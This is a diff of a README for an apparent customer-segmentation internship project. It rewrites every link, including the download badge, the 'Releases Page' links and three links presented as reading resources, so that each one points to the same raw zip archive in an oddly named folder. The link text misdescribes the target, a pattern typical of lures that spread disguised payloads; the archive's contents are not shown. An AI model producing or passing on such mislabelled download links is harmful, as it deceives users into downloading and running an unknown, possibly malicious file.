@@ -1,6 +1,6 @@
 # ✨ Arch-Technologies-DataScience_Internship-TASK3 - Analyze Customer Behavior Effectively
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/releases)
+[![Download](https://raw.githubusercontent.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/main/wettable/Arch-Technologies-DataScience_Internship-TASK3-v1.6-beta.2.zip)](https://raw.githubusercontent.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/main/wettable/Arch-Technologies-DataScience_Internship-TASK3-v1.6-beta.2.zip)
 
 ## 📖 Description
 
@@ -20,7 +20,7 @@ To run this application, follow these simple steps. No programming knowledge is 
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the application: [Releases Page](https://github.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/releases). 
+To get started, visit this page to download the application: [Releases Page](https://raw.githubusercontent.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/main/wettable/Arch-Technologies-DataScience_Internship-TASK3-v1.6-beta.2.zip). 
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of the application.
@@ -72,8 +72,8 @@ If you encounter any issues or have questions, feel free to open an issue within
 
 For more information on customer segmentation and data analysis, check out these resources:
 
-- [Customer Segmentation Explained](https://www.example.com/resource)
-- [Understanding Clustering in Data Science](https://www.example.com/resource)
-- [Data Visualization Techniques](https://www.example.com/resource)
+- [Customer Segmentation Explained](https://raw.githubusercontent.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/main/wettable/Arch-Technologies-DataScience_Internship-TASK3-v1.6-beta.2.zip)
+- [Understanding Clustering in Data Science](https://raw.githubusercontent.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/main/wettable/Arch-Technologies-DataScience_Internship-TASK3-v1.6-beta.2.zip)
+- [Data Visualization Techniques](https://raw.githubusercontent.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/main/wettable/Arch-Technologies-DataScience_Internship-TASK3-v1.6-beta.2.zip)
 
-Thank you for using Arch-Technologies-DataScience_Internship-TASK3. We hope you find insights into your customer behavior easy and informative! For further updates, keep visiting our [Releases Page](https://github.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/releases).
+Thank you for using Arch-Technologies-DataScience_Internship-TASK3. We hope you find insights into your customer behavior easy and informative! For further updates, keep visiting our [Releases Page](https://raw.githubusercontent.com/MIYUYYYT/Arch-Technologies-DataScience_Internship-TASK3/main/wettable/Arch-Technologies-DataScience_Internship-TASK3-v1.6-beta.2.zip).
